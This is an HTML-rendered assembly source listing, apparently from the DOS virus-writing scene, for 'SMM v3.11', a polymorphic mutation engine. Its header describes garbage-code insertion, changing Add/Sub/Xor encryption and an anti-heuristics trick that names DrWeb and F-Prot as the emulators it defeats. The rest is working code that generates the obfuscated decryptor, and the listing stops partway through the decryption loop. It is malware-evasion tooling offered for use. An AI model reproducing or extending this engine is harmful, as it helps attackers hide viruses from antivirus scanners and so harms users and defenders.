<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>SMM.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; SMM Version v.3.11 by Deviator from [HAZARD] Team</span><span class="sc0">

</span><span class="sc1">; Features:</span><span class="sc0">
</span><span class="sc1">;  - Higher level of polymorphics</span><span class="sc0">
</span><span class="sc1">;  - Creating of calls/jumps</span><span class="sc0">
</span><span class="sc1">;  - Different encryption type methods (Add/Sub/Xor) with changing key from</span><span class="sc0">
</span><span class="sc1">;    word to word</span><span class="sc0">
</span><span class="sc1">;  - Anti-Heuristics code (if you wish)</span><span class="sc0">
</span><span class="sc1">;  - Another nice stuff</span><span class="sc0">
</span><span class="sc1">;  - Optimized alot</span><span class="sc0">

</span><span class="sc1">; Changes from 3.07</span><span class="sc0">
</span><span class="sc1">;  - Many bugs fixed</span><span class="sc0">
</span><span class="sc1">;  - Added forward call routine</span><span class="sc0">
</span><span class="sc1">;  - Added one variable for reserving register (Resv2)</span><span class="sc0">
</span><span class="sc1">;  - Different encryption methods (Add/Sub/Xor)</span><span class="sc0">
</span><span class="sc1">;  - Now Maximum and Minimum garbage numbers stored in variables.</span><span class="sc0">
</span><span class="sc1">;  - Some constants moved to the start of source (Call number,etc..)</span><span class="sc0">
</span><span class="sc1">;  - Added In al,[Port8] and shifting operators</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Input: Ds=Cs=Es</span><span class="sc0">
</span><span class="sc1">; Ds:Si - Source data to be crypted</span><span class="sc0">
</span><span class="sc1">; Es:Di - Destination, where to put crypted data with decryptor</span><span class="sc0">
</span><span class="sc1">; Cx    - Length of data to crypt</span><span class="sc0">

</span><span class="sc1">; If you want to change decryptor size (and it's speed) change value of</span><span class="sc0">
</span><span class="sc1">; MaxGarb. MinGarb better leave from 1 to 5.</span><span class="sc0">

</span><span class="sc1">; Returns:</span><span class="sc0">
</span><span class="sc1">; Cx    - Decryptor+Source data size</span><span class="sc0">
</span><span class="sc1">; Es:Di - Filled with crypted data and decryptor</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; Principles of SMM work.</span><span class="sc0">
</span><span class="sc1">; - 1 Step. Choose in which registers do which job. For decryptor needed </span><span class="sc0">
</span><span class="sc1">;           three different registers which is Counter,Pointer and Keyword. </span><span class="sc0">
</span><span class="sc1">;           Pointer could be Si,Di,Bx. Counter and Keyword cold be any, </span><span class="sc0">
</span><span class="sc1">;       except Sp.</span><span class="sc0">
</span><span class="sc1">; - 2 Step. Creation of decryptor. Decryptor creates byte by byte.</span><span class="sc0">
</span><span class="sc1">;       Between every byte of decryptor space filled with the garbage.</span><span class="sc0">
</span><span class="sc1">; - 3 Step. Crypt source data</span><span class="sc0">

</span><span class="sc1">; Decryptor looks like (when without garbage):</span><span class="sc0">

</span><span class="sc1">;       call GetOff</span><span class="sc0">
</span><span class="sc1">;GetOff:    pop Pointer</span><span class="sc0">
</span><span class="sc1">;       sub Pointer,offset GetOff</span><span class="sc0">
</span><span class="sc1">;       add Pointer,offset EndOfDecryptor</span><span class="sc0">
</span><span class="sc1">;       mov Counter,DataLen</span><span class="sc0">
</span><span class="sc1">;       mov Keyword,Key</span><span class="sc0">
</span><span class="sc1">;DLoop:     xor/add/sub cs:[Pointer],Keyword</span><span class="sc0">
</span><span class="sc1">;       dec Counter</span><span class="sc0">
</span><span class="sc1">;       inc Pointer</span><span class="sc0">
</span><span class="sc1">;       inc Pointer</span><span class="sc0">
</span><span class="sc1">;       add Keyword,KeyAdd</span><span class="sc0">
</span><span class="sc1">;       or Counter,Counter</span><span class="sc0">
</span><span class="sc1">;       jne NotDcrp</span><span class="sc0">
</span><span class="sc1">;       jmp EndOfDecryptor</span><span class="sc0">
</span><span class="sc1">;NotDcrp:   jmp DLoop</span><span class="sc0">
</span><span class="sc1">;EndOfDecryptor:</span><span class="sc0">

</span><span class="sc1">; With garbage - between every instruction of decryptor randomed size garbage.</span><span class="sc0">

</span><span class="sc1">; Where Pointer,Counter,Keyword - different registers and Key,KeyAdd - random</span><span class="sc0">
</span><span class="sc1">; numbers.</span><span class="sc0">

</span><span class="sc1">; Yeap, i could throw some code out of decryptor , but wouldn't... ;)</span><span class="sc0">

</span><span class="sc1">; Decryptors produced by engine is huge(could be) with alot of jumps,calls</span><span class="sc0">
</span><span class="sc1">; ,etc... So large decryptors works very slowely...</span><span class="sc0">

</span><span class="sc1">; Bugz: Registers is uncontrolled, so on my i386 when happened opcode</span><span class="sc0">
</span><span class="sc1">; like mov ax,[Bx+Si] and  all work well. But when Bx+Si = 0FFFFh system just</span><span class="sc0">
</span><span class="sc1">; hangups... I dont know how to control this...</span><span class="sc0">

</span><span class="sc1">; If you have any questions - email me at Biodrone2@Hotmail.com</span><span class="sc0">

</span><span class="sc1">; Needed Smm.Dat to be included.</span><span class="sc0">

</span><span class="sc5">CallN</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">          </span><span class="sc1">; Max. procedures number</span><span class="sc0">
</span><span class="sc5">InCall</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; Num. of overlaying procedures</span><span class="sc0">
</span><span class="sc5">InJmp</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Num. of procedures inside 8bit jmp</span><span class="sc0">
</span><span class="sc5">InJxn</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Num. of overlaying jumps</span><span class="sc0">
</span><span class="sc5">FCalln</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; Max. forward calls number</span><span class="sc0">
</span><span class="sc5">NoGarb</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Use this in testing purpose only</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">smm</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">             </span><span class="sc1">; Get working offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getff</span><span class="sc0">
</span><span class="sc5">getff</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getff</span><span class="sc0">

    </span><span class="sc6">pusha</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">CCalls</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Clean data variables</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">DataL</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldsi</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Store values</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">olddi</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldcx</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">resv</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">; Mark as non-used</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">resv2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; 4 means SP, which is not used</span><span class="sc0">
                    </span><span class="sc1">; in decryptor</span><span class="sc0">

</span><span class="sc1">; Setup Base Decryptor Registers</span><span class="sc0">

</span><span class="sc5">NoSp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; Setup Counter Register</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoSp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Store counter</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">BadPointer</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; Setup Pointer Register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">TryBx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">CheckCounter</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Same to Counter ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadPointer</span><span class="sc0">               </span><span class="sc1">; Yeap...</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StorePointer</span><span class="sc0">
</span><span class="sc5">TryBx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckCounter</span><span class="sc0">
</span><span class="sc5">StorePointer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Store pointer</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">BadKey</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; Choose keyword</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadKey</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Check it with counter</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadKey</span><span class="sc0">               </span><span class="sc1">; Equal...</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Now with pointer</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadKey</span><span class="sc0">               </span><span class="sc1">; Equal...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">KeyWord</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Store keyword</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">Decryptor</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">              </span><span class="sc1">; Create garbage</span><span class="sc0">
                        </span><span class="sc1">; Created garbage doesn't</span><span class="sc0">
                        </span><span class="sc1">; uses any registers which</span><span class="sc0">
                        </span><span class="sc1">; is reserved.</span><span class="sc0">

    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Create call</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Callp</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; Store offset for later patch</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Fill up</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">              </span><span class="sc1">; Garbage more</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Callp</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Patch newly created call</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">              </span><span class="sc1">; Garble...</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Pop pointer</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">              </span><span class="sc1">; Garble</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Sub Pointer , offset GetOff</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Opcode...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Callp</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldDi</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Opcode data</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">              </span><span class="sc1">; Garble...</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Add Pointer , offset to Data</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Callp</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc1">;---------------- Anti Heuristics Trick -------------------</span><span class="sc0">

</span><span class="sc1">; Simple anti-heuristics trick.</span><span class="sc0">
</span><span class="sc1">; In all dos which versions higher than 3.00 returns in Ax 00FFh when</span><span class="sc0">
</span><span class="sc1">; called function 1200h of int 2Fh.</span><span class="sc0">
</span><span class="sc1">; Code of trick:</span><span class="sc0">

</span><span class="sc1">; mov ax,1200h</span><span class="sc0">
</span><span class="sc1">; int 2Fh</span><span class="sc0">
</span><span class="sc1">; sub ax,0FFh</span><span class="sc0">
</span><span class="sc1">; add pointer,ax</span><span class="sc0">

</span><span class="sc1">; In emulation (DrWeb,F-Prot) after int call in ax would be 0. Sub it by 0FFh</span><span class="sc0">
</span><span class="sc1">; We would get something like -0FFh (large number). When we add this to </span><span class="sc0">
</span><span class="sc1">; pointer, it would point who knows where...</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AntiH1</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoTrick1</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resv</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Reserve Ax (garbage wouldn't</span><span class="sc0">
                    </span><span class="sc1">; trash it)</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">AntiH1C</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">movsw</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">movsw</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resv</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">; Free up register</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">NoTrick1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">
    
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Move to Counter Number</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldCx</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">BegCr</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Move to KeyWord base key</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">KeyWord</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

</span><span class="sc1">; Here Begins Creation Of Decryption Loop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LoopSt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
    
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">Ctbl</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PatchIt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Patch for Pointer</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItsBx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">DonePatch</span><span class="sc0">       
</span><span class="sc5">ItsBx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">DonePatch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">KeyWord</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">
